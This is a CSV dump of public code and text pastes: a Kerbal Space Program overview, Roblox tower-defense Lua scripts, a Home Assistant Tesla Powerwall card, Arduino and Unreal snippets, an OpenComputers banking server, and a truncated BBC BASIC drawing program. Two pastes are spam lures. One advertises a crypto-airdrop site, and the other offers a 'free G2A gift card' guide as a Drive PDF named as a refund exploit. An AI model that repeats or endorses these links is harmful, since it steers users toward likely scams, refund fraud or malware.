id,title,username,language,date,content
9KCVeNz7,Untitled,Glenpl,C++,Sunday 21st of January 2024 12:03:16 AM CDT,"Tell me about game ""kerbal space program"". 

---eeee

""Kerbal Space Program"" (KSP) is a space flight simulation video game that was originally developed by Squad, a Mexican game developer. It was first released for Microsoft Windows, macOS, and Linux in April 2015, after being in early access for several years.

In Kerbal Space Program, players take control of their own space program operated by the Kerbals, which are small green humanoid aliens. The game features a realistic orbital physics engine, allowing for real-life orbital maneuvers such as Hohmann transfer orbits and bi-elliptical transfer orbits.

The primary mode of the game has the player engaging in building spacecraft, managing resources, and conducting missions. The spacecraft is constructed from a variety of parts that must be assembled to create a functional ship. These parts include engines, fuel tanks, control surfaces, and more. Each component affects the ship's performance, requiring the player to carefully consider the trade-offs when designing their missions.

The game has three primary modes:

1. **Sandbox Mode**: This mode gives players the freedom to create and fly any spacecraft they can imagine, with no specific goals or limitations.

2. **Science Mode**: Players conduct scientific experiments to research new technology and advance the knowledge of Kerbalkind. Through this progress, more advanced parts and technologies become available for spacecraft construction.

3. **Career Mode**: This mode combines the aspects of sandbox and science modes but also introduces management aspects. Players must manage aspects of the space program, including finances, reputation, and mission contracts.

Kerbal Space Program is known for its challenging gameplay, educational aspects, and the accurate physics simulation it offers, which makes it both a game and a learning tool for understanding the basics of rocket science and orbital mechanics. The game's community has been praised for its creativity and enthusiasm, with players sharing custom mods, spacecraft designs, and even complete missions.

KSP has been used in educational settings as well as by space professionals and enthusiasts. Moreover, it has had several updates and expansion packs that have added new features, improved the graphics, and expanded the gameplay.

Squad released the Making History expansion in 2018, which introduced a mission builder and historical missions. The second expansion, Breaking Ground, was released in 2019, focusing on planetary exploration, new science collection capabilities, and more advanced robotics parts.

As of my knowledge cutoff date in 2023, Kerbal Space Program 2 is also in development, promising to build upon the success of the first game with new features, improved graphics, and more expansive gameplay. The sequel aims to introduce interstellar travel, new celestial bodies, and a multiplayer feature, among other enhancements."
hBSEki0v,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Saturday 20th of January 2024 11:45:22 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

202089"
dYwbUs3c,pbs rolls,Zeefoe,Lua,Saturday 20th of January 2024 11:33:03 PM CDT,"local player = game.Players.LocalPlayer
local character = player.Character

local backpack = player:FindFirstChildOfClass(""Backpack"")

--toilet rolls
tools = 8

if backpack then
    local toolsToEquip = backpack:GetChildren()

    for loopCount = 1, math.min(#toolsToEquip, tools) do
        local currentTool = toolsToEquip[loopCount]

        for _, tool in pairs(character:GetDescendants()) do
            if tool:IsA(""Tool"") then
                tool.Parent = backpack
            end
        end

        if currentTool:IsA(""Tool"") then
            currentTool.Parent = character

            if loopCount == tools - 1 then
                currentTool.GripPos = Vector3.new(2, 2, -1)
            elseif loopCount == tools then
                currentTool.GripPos = Vector3.new(1, 2, -1)
            else
                currentTool.GripPos = Vector3.new(1.5, 0.5 - (loopCount - 1) * 0.9, 1.5)
                currentTool.GripUp = Vector3.new(0, 0, 90)
            end
        end
    end

    for _, finalTool in pairs(toolsToEquip) do
        if finalTool:IsA(""Tool"") then
            finalTool.Parent = character
        end
    end
end
"
GmfcQBVE,Controller (Local Script / EP.09),Anukun_Lucifer,Lua,Saturday 20th of January 2024 11:11:11 PM CDT,"local Players = game:GetService(""Players"")
local physicsservice = game:GetService(""PhysicsService"")
local replicatedstorage = game:GetService(""ReplicatedStorage"")
local runservice = game:GetService(""RunService"")
local userinputservice = game:GetService(""UserInputService"")

local gold = Players.LocalPlayer:WaitForChild(""Gold"")
local events = replicatedstorage:WaitForChild(""Events"")
local functions = replicatedstorage:WaitForChild(""Functions"")
local requestTowerFuntion = functions:WaitForChild(""RequestTower"")
local tower = replicatedstorage:WaitForChild(""Towers"")
local spawntowerevent = events:WaitForChild(""SpawnTower"")
local camera = workspace.CurrentCamera
local gui = script.Parent

local towertospawn = nil
local canplace = false
local rotation = 0
local platedTower = 0
local maxTowers = 10

local function UpdateGold()
	gui.Gold.Text = gold.Value
end
UpdateGold()
gold.Changed:Connect(UpdateGold)

local function MouseRaycast(blacklist)
	local mouseposition = userinputservice:GetMouseLocation()
	local mouseray = camera:ViewportPointToRay(mouseposition.X,mouseposition.Y)
	local raycastparams = RaycastParams.new()

	raycastparams.FilterType = Enum.RaycastFilterType.Blacklist
	raycastparams.FilterDescendantsInstances = blacklist

	local raycastresult = workspace:Raycast(mouseray.Origin,mouseray.Direction*1000, raycastparams)

	return raycastresult
end

local function RemovePlaceholderTower()
	if towertospawn then
		towertospawn:Destroy()
		towertospawn = nil
		rotation = 0
	end
end

local function AddPlaceholderTower(name)
	local towerExists = tower:FindFirstChild(name)
	if towerExists then
		RemovePlaceholderTower()
		towertospawn = towerExists:Clone()
		towertospawn.Parent = workspace

		for i, object in ipairs(towertospawn:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Tower"")
				object.Material = Enum.Material.ForceField
			end
		end
	end
end

local function ColorPlanceholderTower(color)
	for i, object in ipairs(towertospawn:GetDescendants()) do
		if object:IsA(""BasePart"") then
			object.Color = color
		end
	end
end

gui.Tower.Title.Text = ""Towers""..platedTower..""/""..maxTowers
for i , tower in pairs(tower:GetChildren()) do
	local button = gui.Tower.Template:Clone()
	local config = tower:WaitForChild(""Config"")
	button.Name = tower.Name
	button.Image = config.Image.Texture
	button.Visible = true
	
	button.LayoutOrder = config.Price.Value
	button.Price.Text = config.Price.Value
	
	button.Parent = gui.Tower
	
	button.Activated:Connect(function()
		local allowedToSpawn = requestTowerFuntion:InvokeServer(tower.Name)
		if allowedToSpawn then
			AddPlaceholderTower(tower.Name)
		end
	end)
end

userinputservice.InputBegan:Connect(function(input, processed)
	if processed then
		return
	end

	if towertospawn then
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			if canplace then
				spawntowerevent:FireServer(towertospawn.Name, towertospawn.PrimaryPart.CFrame)
				platedTower += 1
				gui.Tower.Title.Text = ""Towers""..platedTower..""/""..maxTowers
				RemovePlaceholderTower()
			end
		elseif input.KeyCode == Enum.KeyCode.R then
			rotation += 90
		end
	end

end)

runservice.RenderStepped:Connect(function()
	if towertospawn then
		local result = MouseRaycast({towertospawn})
		if result and result.Instance then
			if result.Instance.Parent.Name == ""TowerArea"" then
				canplace = true
				ColorPlanceholderTower(Color3.new(0,1,0))
			else
				canplace = false
				ColorPlanceholderTower(Color3.new(1,0,0))
			end
			local x = result.Position.X
			local y = result.Position.Y + towertospawn.Humanoid.HipHeight + 4
			local z = result.Position.Z

			local cframe = CFrame.new(x,y,z) *CFrame.Angles(0,math.rad(rotation),0)
			towertospawn:SetPrimaryPartCFrame(cframe)
		end
	end
end)"
7f5t2Wwn,TowerScript (Module Script / EP.09),Anukun_Lucifer,Lua,Saturday 20th of January 2024 11:10:21 PM CDT,"local physicsservice = game:GetService(""PhysicsService"")
local serverstorage = game:GetService(""ServerStorage"")
local replicatedstorage = game:GetService(""ReplicatedStorage"")
local functions = replicatedstorage:WaitForChild(""Functions"")
local requestTowerFuntion = functions:WaitForChild(""RequestTower"")

local event = replicatedstorage:WaitForChild(""Events"")
local spawntowerevent = event:WaitForChild(""SpawnTower"")
local animatetowerevent = event:WaitForChild(""AnimateTower"")
local maxTowers = 10

local tower = {}
--------------------------------------------
local function FindNearestTarget(newTower,range)
	local nearestTarget = nil

	for i, target in ipairs(workspace.Grassland.Mob:GetChildren()) do
		local distance = (target.HumanoidRootPart.Position - newTower.HumanoidRootPart.Position).Magnitude
		if distance < range then
			nearestTarget = target
			range = distance
		end
	end

	return nearestTarget
end

function tower.Attack(newTower ,player)
	local config = newTower.Config
	local target = FindNearestTarget(newTower,config.Range.Value)
	
	if target and target:FindFirstChild(""Humanoid"") and target.Humanoid.Health > 0 then
		
		local targetCFrame = CFrame.lookAt(newTower.HumanoidRootPart.Position, target.HumanoidRootPart.Position)
		newTower.HumanoidRootPart.BodyGyro.CFrame = targetCFrame
		
		animatetowerevent:FireAllClients(newTower, ""Attack"")
		target.Humanoid:TakeDamage(config.Damage.Value)
		
		if target.Humanoid.Health <= 0 then
			player.Gold.Value += target.Humanoid.MaxHealth
		end
		
		task.wait(config.Cooldown.Value)
		
	end
	task.wait(0.1)
 	tower.Attack(newTower ,player)
end
---------------------------------------------
function tower.Spawn(player, name, cframe)
	local allowedToSpawn = tower.CheckSpawn(player, name)

	if allowedToSpawn then
		local newTower = replicatedstorage.Towers[name]:Clone()
		newTower.HumanoidRootPart.CFrame = cframe
		newTower.Parent = workspace.Grassland.Tower
		newTower.HumanoidRootPart:SetNetworkOwner(nil)
		
		local bodyGyro = Instance.new(""BodyGyro"")
		bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		bodyGyro.D = 0
		bodyGyro.CFrame = newTower.HumanoidRootPart.CFrame
		bodyGyro.Parent = newTower.HumanoidRootPart

		for i, object in ipairs(newTower:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Tower"")
			end
		end
		
		player.Gold.Value -= newTower.Config.Price.Value
		player.PlacedTowers.Value +=1
		
		coroutine.wrap(tower.Attack) (newTower ,player)
	else
		warn(""Requested mob dose not exist"",name)
	end
end

spawntowerevent.OnServerEvent:Connect(tower.Spawn)

function tower.CheckSpawn(player, name)
	local towerExists = replicatedstorage.Towers:FindFirstChild(name)
	
	if towerExists then
		if towerExists.Config.Price.Value <= player.Gold.Value then
			print(""okkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"")
			if player.PlacedTowers.Value < maxTowers then
				return true
			end
		end
	end
	return false
end

requestTowerFuntion.OnServerInvoke = tower.CheckSpawn

return tower"
xwc6BN3H,OnPlayerAdded (Script / EP.09),Anukun_Lucifer,Lua,Saturday 20th of January 2024 11:09:35 PM CDT,"local players = game:GetService(""Players"")
local physicsservice = game:GetService(""PhysicsService"")

players.PlayerAdded:Connect(function(player)
	
	local gold = Instance.new(""IntValue"")
	gold.Name = ""Gold""
	gold.Value = 250
	gold.Parent = player
	
	local placedTowers = Instance.new(""IntValue"")
	placedTowers.Name = ""PlacedTowers""
	placedTowers.Value = 0
	placedTowers.Parent = player
	
	player.CharacterAdded:Connect(function(character)
		for i, object in ipairs(character:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Player"")
			end
		end
	end)
end)"
zNNEiGR5,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Saturday 20th of January 2024 11:07:14 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_879767.pdf
 
Working as of
21 January 2024"
vnvbx6w9,Custom Tesla Powerwall Card - MKANET,MKANET,YAML,Saturday 20th of January 2024 10:43:12 PM CDT,"type: custom:stack-in-card
mode: vertical
cards:
  - type: markdown
    content: >
      ## Tesla Powerwall{% if is_state('binary_sensor.grid_status', 'off')
      %}<small><font color=""red"">&nbsp;&nbsp;⚠️&nbsp;Power Outage:
      &nbsp;&nbsp;~{{ states('sensor.estimated_battery_life_hours_remaining') }}
      battery hours remaining</font></small>{% endif %}
    card_mod:
      style: |
        ha-card {
          margin: 0;
          padding-left: 10px;
          padding-right: 10px;
          background: var(--card-background-color);
          box-shadow: none;
          border: none;
        }
        ha-markdown {
          font-size: 10px;
          color: var(--primary-text-color);
          margin-bottom: -8px;
        }
  - type: custom:power-flow-card-plus
    entities:
      grid:
        name: PG&E
        entity: sensor.powerwall_site_now_mod
        secondary_info:
          entity: sensor.pge_electric_cost_to_date
          unit_of_measurement: $
          unit_white_space: false
          color_value: true
        display_state: one_way
        color_circle: true
        color_icon: true
        color_value: true
        power_outage:
          entity: binary_sensor.grid_status
          state_alert: 'off'
      solar:
        entity: sensor.powerwall_solar_now
        display_zero_tolerance: 30
        icon: mdi:solar-panel-large
        secondary_info:
          entity: sensor.openweathermap_forecast_cloud_coverage
          unit_of_measurement: '%'
          unit_white_space: false
          color_value: true
        color_icon: true
        color_value: true
      battery:
        entity: sensor.powerwall_battery_now
        state_of_charge: sensor.powerwall_charge_actual
        state_of_charge_unit: '%'
        state_of_charge_unit_white_space: false
        display_state: one_way
        color_state_of_charge_value: true
        color_icon: true
        color_circle: true
      home:
        entity: sensor.powerwall_load_now
        color_icon: true
        color_value: true
    watt_threshold: 999
    calculate_flow_rate: true
    w_decimals: 1
    kw_decimals: 1
    min_flow_rate: 2.2
    max_flow_rate: 6
    display_zero_lines:
      mode: hide
    clickable_entities: true
    use_new_flow_rate_model: true
    max_expected_power: 5000
    card_mod:
      style: |
        @keyframes blink {
          0% { opacity: 1; }
          50% { opacity: 0; }
          100% { opacity: 1; }
        }
        ha-card {
          zoom: 1.2 !important;
          box-shadow: none !important;
          border: none !important;
          padding-left: 10px;
          padding-right: 10px;
        }
        .circle-container .grid.power-outage {
          color: #FF403D !important;
          animation: blink 2.475s linear infinite;
        }
        .label {
          font-weight: 700 !important;
        }
        .circle ha-icon {
          --mdc-icon-size: 36px;
        }
  - type: markdown
    content: ⠀
    card_mod:
      style: |
        ha-card {
          box-shadow: none;
          border: none;
          margin-bottom: -48px;
        }
  - type: custom:bar-card
    height: 31px
    direction: right
    positions:
      icon: 'off'
      indicator: 'off'
      title: 'off'
    severity:
      - hide: false
        from: '0'
        to: '19'
        color: '#C41400'
      - from: '20'
        to: '49'
        color: '#EA9000'
      - from: '50'
        to: '100'
        color: '#007A00'
    card_mod:
      style: |
        ha-card {
          border: none;
          padding-left: 14px;
          padding-right: 14px;
          background: var(--card-background-color);
          box-shadow: none;
        }
    entities:
      - entity: sensor.powerwall_charge_actual
        name: Powerwall Charge
  - type: custom:button-card
    entity: binary_sensor.powerwall_charging
    show_name: false
    show_icon: false
    show_label: true
    label: |-
      [[[
        var charge = states['sensor.powerwall_charge_actual'].state;
        var batteryStatus = parseFloat(states['sensor.apf_battery_entity'].state);
        var state = states['binary_sensor.powerwall_charging'].state;
        var icon = '';
        if (charge <= 19) icon = 'mdi:battery-charging-10';
        else if (charge <= 49) icon = 'mdi:battery-charging-30';
        else if (charge <= 100) icon = 'mdi:battery-charging-90';
        var label = (state == 'off') ? 'Standby' : 'Charging';
        if (batteryStatus < 0) label = 'Discharging';
        var textAnimationStyle = '';
        if (state == 'on') {
          textAnimationStyle = 'animation: blink 2.475s linear infinite;';
        }
        var iconHtml = '';
        if (state == 'on') {
          iconHtml = `<ha-icon icon='${icon}' style='color: #FFCC00; width: 20px; height: 20px;'></ha-icon>`;
        }
        return `<div style='text-align: center; display: inline-block; width: 100%; padding-bottom: 11px;'>
              ${iconHtml}
              <span style='margin-left: 6px; position: relative; top: 1.5px; font-size: 14px; font-weight: 700; color: #bbb; ${textAnimationStyle}'>${label}</span>
            </div>`;
      ]]]
    styles:
      card:
        - background-color: linear-gradient(rgba(105, 105, 105, 0.1), rgba(34, 34, 34, 0.95))
        - margin-top: '-9px'
        - border-top: none
        - border-top-left-radius: 0px
        - border-top-right-radius: 0px
        - box-shadow: none
      label:
        - justify-self: center
        - align-self: center
        - width: 100%
        - font-size: 14px
        - font-weight: 600
        - margin-top: '-8px'
    card_mod:
      style: |
        ha-card {
          border: none;
          background: var(--card-background-color);
          box-shadow: none;
          margin-bottom: 0px !important;
        }
  - type: custom:button-card
    entity: sensor.estimated_battery_life_hours_remaining
    tap_action:
      action: more-info
    layout: icon-label
    size: 20%
    color_type: card
    show_name: true
    show_state: true
    show_icon: false
    show_units: true
    card_mod:
      style: |
        ha-card {
          height: auto;
          padding-bottom: 25px !important;
          padding-left: 7px !important;
          background: transparent !important;
          box-shadow: none;
          border-top: none;
          margin: 0;
        }
    styles:
      grid:
        - grid-template-areas: '""n s""'
        - grid-template-columns: max-content min-content
        - grid-template-rows: 1fr
      name:
        - font-size: 14px
        - font-weight: 400
        - justify-self: start
        - padding-left: 22px
        - margin-right: 10px
        - white-space: nowrap
        - color: '#838383'
      state:
        - font-size: 14px
        - font-weight: 400
        - justify-self: start
        - padding-left: 0
        - color: '#B7A064'
        - margin-top: 1.8px
    name: 'Estimated outage battery runtime:'
    state_display: >
      [[[ return states['sensor.outage_battery_runtime_estimate'].state +
      '&nbsp; (' + states['sensor.estimated_battery_life_hours_remaining'].state
      + ' hours)' ]]]
"
CBFZzJRP,InventoryItem.cpp,devenshona,C++,Saturday 20th of January 2024 10:22:27 PM CDT,"// Fill out your copyright notice in the Description page of Project Settings.


#include ""Actors/InventoryItem.h""


// Sets default values
AInventoryItem::AInventoryItem()
{
	// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.
	PrimaryActorTick.bCanEverTick = true;
}

// Called when the game starts or when spawned
void AInventoryItem::BeginPlay()
{
	Super::BeginPlay();
	
}

// Called every frame
void AInventoryItem::Tick(float DeltaTime)
{
	Super::Tick(DeltaTime);
}

/**
 * Uses the given item.
 *
 * @param Row - The static item information.
 * @param InventoryComponentRef - The reference to the inventory component.
 * @param Index - The index of the item being used.
 *
 * @note This method is called when an item needs to be used.
 */
void AInventoryItem::UseItem_Implementation(FStaticItemInfo* Row,UInventoryComponent* InventoryComponentRef,int32 Index)
{
}



"
PJekQUkw,Lampu LED Berkedip dengan Kreativitas,cisco404,C++,Saturday 20th of January 2024 10:20:39 PM CDT,"// Definisi pin LED RGB
int redPin = 9;
int greenPin = 10;
int bluePin = 11;

void setup() {
  // Atur pin sebagai OUTPUT
  pinMode(redPin, OUTPUT);
  pinMode(greenPin, OUTPUT);
  pinMode(bluePin, OUTPUT);
}

void loop() {
  // Merah
  analogWrite(redPin, 255);
  analogWrite(greenPin, 0);
  analogWrite(bluePin, 0);
  delay(1000); // Tahan selama 1 detik

  // Hijau
  analogWrite(redPin, 0);
  analogWrite(greenPin, 255);
  analogWrite(bluePin, 0);
  delay(1000); // Tahan selama 1 detik

  // Biru
  analogWrite(redPin, 0);
  analogWrite(greenPin, 0);
  analogWrite(bluePin, 255);
  delay(1000); // Tahan selama 1 detik
}
"
jGMM1vqD,pimserver.lua,taoshi,Lua,Saturday 20th of January 2024 09:20:38 PM CDT,"--pimserver
local pimserver={}
pimserver.version='1.00'
local db={}
local owners={}
local event=require('event')
local modem=require('component').modem
local port = 0xfffe
local send = 0xffef
local fs = require('filesystem')
--local log={}
local serialization = require('serialization')
local terminal={}
local unregistered={}
local gpu = require('component').gpu
modem.open(port)
modem.setWakeMessage=""{name=""
local player_on = false
local computer=require('computer')
local pullSignal=computer.pullSignal	
computer.pullSignal=function(...)
	local e={pullSignal(...)}
	if e[1]=='modem_message' then
		return pimserver.modem(e)
	end
	if e[1]=='touch' then
		return pimserver.accept(e)
	end
	if e[1]=='player_on' then
		return pimserver.regOwner(e)
	end
	return table.unpack(e) 
end

function pimserver.modem(e) ---1type 2respondent 3sender 4port 5distance 6message
	local sender=e[3]
	os.sleep(0.05)
	--want to msg fields:
	--msg.number
	--msg.name =name of player
	--msg.op = enter|buy|sell|balanceIn|balanceOut
	--msg.value = value of operation
	local msg = serialization.unserialize(e[6])
  msg.sender = sender
  --регистрация терминалов
  if msg.name and msg.name=='pimmarket' then
  		return pimserver[msg.op](sender)
  end
  --проверка валидности адреса посылки
  local valid = false
  for n in pairs(terminal) do
  	if terminal[n]==sender then valid = true end
  end
	if not valid then return 'не знаем мы таких' end
	--если такого игрока нет, то запись нового игрока в бд
	if msg.name and not db[msg.name] then pimserver.newUser(msg.name) end
	--если в сообщении есть имя игрока отправляем по типу операции
	if msg.name then return pimserver[msg.op](msg) end
	--поиск отклика завершенных событий
	--if msg.complite==true then return true end
	--остальные события нас не интересуют
	return true
end

--постановка терминала в список ожидания регистрации
function pimserver.connect(sender)
	for n in pairs(terminal) do
		--если такой терминал есть в списке валидных
  	if terminal[n]==sender then
  		return pimserver.returnAccept(sender)
  	end
  end
	table.insert(unregistered,sender)
	return pimserver.place()
end
function pimserver.getOwners(sender)
	local msg={sender=sender,number=1,name='pimmarket',balance=0,op='getOwners'}
	msg.owners=owners
	pimserver.post(msg)
end

--отсылка подтверждения регистрации
function pimserver.accept(msg)
	local who = msg[6]
	for id in pairs(owners)do
		if owners[id].name == who then
			who = nil
		end
	end
	if who then return true end
	
	local x,y = msg[3],msg[4]
	--if msg[6]==adminname then
	if x < 4 and y == 1 then
		return pimserver.WaitToNewOwner()
	end
	if y < 13 then return true end
	y=y-12
	if x == 3 and y <= #unregistered then
		table.remove(unregistered,y)
	end
	if x == 43 and y <= #unregistered then
		local sender=table.remove(unregistered,y)
		table.insert(terminal, sender)
		pimserver.saveTerminalsToFile()
		return pimserver.returnAccept(sender)
	end
	--end
	return true
end

function pimserver.returnAccept(sender)
	local msg={sender=sender,number=1,name='pimmarket',balance=0,op='connect'}
	pimserver.post(msg)
	return pimserver.place()
	end

function pimserver.place()
	local x,y = gpu.getResolution()
	gpu.setBackground(0x113311)
	gpu.setForeground(0x58f029)
	gpu.fill(1,1,x,y,' ')
	gpu.set(1,1,'REG: step on PIM for register owner')
	gpu.set(5,1,'Registered terminals:')
	for t in pairs(terminal) do
		gpu.set(5,t+1,terminal[t])
	end
	gpu.set(5,12,'Unregistered terminals:')
	for t in pairs(unregistered) do
		gpu.set(5,t+12,unregistered[t])
		gpu.set(3,t+12,'X')
		gpu.set(43,t+12,'V')
	end
	return true
end

--первичная регистрация игрока
function pimserver.enter(msg)
	if not db[msg.name] then pimserver.newUser(msg.name)
		print('new user'..msg.name)
		msg.new='new'
	end
	return pimserver.broadcast(msg)
end

--проверка наличия имени в базе данных
function pimserver.isRegistered(msg)
	if not db[msg.name2] then 
		msg.op = 'regFalse'
	else
		msg.op = 'regTrue'
	end
	return pimserver.broadcast(msg)
end

--перевод со счета на счет
function pimserver.transfer(msg)
	if not db[msg.name2] then pimserver.newUser(msg.name2)
		print('new user'..msg.name2)
	end
	db[msg.name].balance=db[msg.name].balance - msg.value
	db[msg.name2].balance=db[msg.name2].balance + msg.value
	return pimserver.broadcast(msg)
end

--вычитание с баланса при покупке
function pimserver.buy(msg)
	db[msg.name].balance=db[msg.name].balance - msg.value
	return pimserver.broadcast(msg)
end

--различные операции вызываемые по ключу в сообщении
function pimserver.sell(msg)
	db[msg.name].balance=db[msg.name].balance + msg.value
	return pimserver.broadcast(msg)
end
function pimserver.balanceIn(msg)
	db[msg.name].balance=db[msg.name].balance + msg.value
	return pimserver.broadcast(msg)
end
function pimserver.balanceOut(msg)
	db[msg.name].balance=db[msg.name].balance - msg.value
	return pimserver.broadcast(msg)
end
--отправка результата с указанием адреса пославшего
function pimserver.broadcast(msg)
  local sender, balance, number, name, op = msg.sender, db[msg.name].balance, msg.number, msg.name, msg.op
	local post={sender=sender,number=number,name=name,balance=balance,op=op}
	if msg.new then post.new='new' end
	pimserver.post(post)	

	--[[if not log[msg.sender] then log[msg.sender]={} end
		log[msg.sender][msg.number]={name=msg.name,op=msg.op,val=msg.value}
	local line='['..serialization.serialize(msg.sender)..']'..'['..serialization.serialize(msg.number)..']'..serialization.serialize(log[msg.sender][msg.mnumber])
	local logs=io.open('logs.pimserver','w','a')
	logs:write(line)
	logs:close()]]--
	return pimserver.saveFile()
end
function pimserver.post(msg)
local post = serialization.serialize(msg)
	return modem.broadcast(send,post)
end


function pimserver.newUser(name)
	db[name]={}
	db[name].balance='0'
	db[name].ban='-'
	db[name].income='0'
	return pimserver.saveFile()
end

function pimserver.WaitToNewOwner()
	if not owners[1] then
		print('Встаньте на ПИМ для регистрации первого владельца')
	else
		print('Встаньте на ПИМ для регистрации следующего владельца')
	end
	player_on = true
	return true
end
function pimserver.regOwner(a) 
	table.insert(owners,{UUID=a[3],name=a[2]})
	print('Благодарю. владелец '..#owners..' '..a[2]..'  UUID:'..a[3]..'  зарегестрирован')
	return pimserver.saveOwnersTable()
end

--сохранение терминалов в файл
function pimserver.saveTerminalsToFile()
	local dbs=io.open('terminals.pimserver','w')
	for n in pairs(terminal)do
		dbs:write(tostring(terminal[n])..'\n')
	end
	dbs:close()
	return true
end

--загрузка терминалов из файла
function pimserver.loadTerminalsFromFile()
	terminal={}
	local dbs=io.open('terminals.pimserver','r')
		local loop = true
		while loop do
			local line=dbs:read('*line')
			if line then
				table.insert(terminal,line)
			else
				loop = false
			end
		end
		
		dbs:close()
		return terminal
	end

function pimserver.saveFile()
	local dbs=io.open('db.pimserver','w')
	for player in pairs(db)do
		dbs:write(tostring(player)..'\n')
		dbs:write(tostring(db[player].ban..'\n'))
		dbs:write(tostring(db[player].balance..'\n'))
		dbs:write(tostring(db[player].income..'\n'))
	end
	dbs:close()
	return true
end

function pimserver.loadFile()
	db={}
	local dbs=io.open('db.pimserver','r')
		local loop = true
		while loop do
			local line=dbs:read('*line')
			if not line then
				loop = false	
			else
				local name=tostring(line)
				db[name]={}
				db[name].ban=tostring(dbs:read('*line'))
				db[name].balance=tostring(dbs:read('*line'))
				db[name].income=tostring(dbs:read('*line'))
			end
		end
		dbs:close()
		return true
end

function pimserver.loadOwnersTable()
	local file=io.open('owners.pimserver')
	owners=serialization.unserialize(file:read('*a'))
	return true
end
function pimserver.saveOwnersTable()
	local file=io.open('owners.pimserver','w')
	local data=serialization.serialize(owners)
	file:write(data)
	file:close()
	return true
end

function pimserver.init()
	if not fs.exists ('home/db.pimserver') then
		pimserver.newUser('Taoshi')
		pimserver.saveFile()
	end
	pimserver.loadFile()
	if fs.exists('home/terminals.pimserver') then
		pimserver.loadTerminalsFromFile()
	end
	if fs.exists('home/owners.pimserver') then
		pimserver.loadOwnersTable()
	else
		pimserver.WaitToNewOwner()
	end
	pimserver.place()
	--[[if not fs.exists('home/logs.pimserver')then
		local lg=io.open('logs.pimserver','w')
		log.fakesender={}
		log.fakesender[1]={name='Taoshi',op='init',val='1'}
		lg:write(serialization.serialize(log))
		lg:close()
	end]]
	return true
end
--создание овнер-листа посредством пим

gpu.setResolution(76,24)
pimserver.init()

print('Сервер поднят.')
modem.broadcast(send,'name')
return pimserver
"
7WeU8k4p,backwards ferrari,lovejoy777,ZXBasic,Saturday 20th of January 2024 08:19:18 PM CDT,"   10 REM ******************************
   20 REM *        AGON LIGHT 2        *
   30 REM *      BBC BASIC MODE 0      *
   40 REM *            DEMO            *
   50 REM *         640 X 480          *
   60 REM *          DRAWING           *
   70 REM *          FERRARI           *
   80 REM *      BY STEVE LOVEJOY      *
   90 REM ******************************
  100 :
  110 REM START OF MAIN PROGRAM.
  120 :
  130 PROC_INIT            : REM CALL INIT PROCESS.
  140 RESTORE 6010
  150 PROC_DRAW_CAR
  160 RESTORE 6300
  170 PROC_DRAW_WHEELS
  180 :
 1000 END                 : REM **** END OF MAIN PROGRAM ****
 1010 :
 3090 REM PROCESS DEFINES.
 4000 DEF PROC_INIT       : REM DEFINE INITIAL PROCESS.
 4010 VDU 22,0            : REM SET SCREEN MODE.
 4020 VDU 23,1,0          : REM DISABLE CURSOR.
 4030 VDU 12              : REM SAME AS CLS (clear text from screen).
 4040 VDU 16              : REM SAME AS CLG (clear graphics from screen).
 4050 REM VARS.
 4050 SW% = 1279          : REM SCREEN WIDTH IN GRAPHICAL UNITS.
 4060 SH% = 1023          : REM SCREEN HEIGHT IN GRAPHICAL UNITS.
 4070 SCX = -5.0            : REM FLOAT FOR SCALE (PLAY WITH THIS #).
 4075 SCY = 5.0            : REM FLOAT FOR SCALE (PLAY WITH THIS #).
 4080 DX% = SW%/2+400     : REM DEFAULT X START COORDS (center of screen -400).
 4090 DY% = SH%/2-50      : REM DEFAULT Y START COORDS (center of screen -50).
 4100 VDU 18,0,9          : REM SET COLOUR OF GRAPHICS.
 4200 ENDPROC             : REM END INIT PROCESS.
 4500 :
 4510 DEF PROC_DRAW_CAR   : REM DEFINE DRAW PROCESS.
 4520 DIM CXY% (1024)     : REM CAR ARRAY BIG ENOUGH NUMBER TO HOLD ALL DATA.
 4530 :
 4540 REPEAT                     : REM START OF CAR LOOP.
 4550     READ CX%,CY%           : REM GET DATA FOR CX & CY.
 4560     IF CX% >= 0 GOTO 4640  : REM IF CX% IS 0 OR ABOVE DRAW.
 4570         REM SPECIAL VALUES, EITHER MOVE OR END.
 4580         IF CX% = -12345 GOTO 4650                 : REM IF CX IS END MARKER.
 4590           CX% = ABS(CX%)                          : REM IF CX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 4600           CY% = ABS(CY%)                          : REM IF CX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 4610           MOVE DX% + (CX% * SCX), DY% + (CY% * SCY) : REM **** MOVE CAR ****
 4620           GOTO 4650
 4630     REM ELSE
 4640           DRAW DX% + (CX% * SCX), DY% + (CY% * SCY) : REM **** DRAW CAR ****
 4650     REM ENDIF
 4660 UNTIL CX% = -12345 AND CY% = -12345               : REM LOOP UNTIL END MARKERS ARE READ.
 4670 :
 4680 ENDPROC                                           : REM END DRAW CAR PROCESS.
 5500 :
 5510 DEF PROC_DRAW_WHEELS       : REM DEFINE DRAW WHEELS PROCESS.
 5520 REM DIM WXY% (1024)        : REM WHEELS ARRAY BIG ENOUGH NUMBER TO HOLD ALL DATA.
 5530 :
 5540 REPEAT                     : REM START OF WHEELS LOOP.
 5550     READ WX%,WY%           : REM GET DATA FOR WX & WY.
 5560     IF WX% >= 0 GOTO 5640  : REM IF WX% IS 0 OR ABOVE = WHEEL RADIUS.
 5570         REM SPECIAL VALUES, EITHER MOVE OR END.
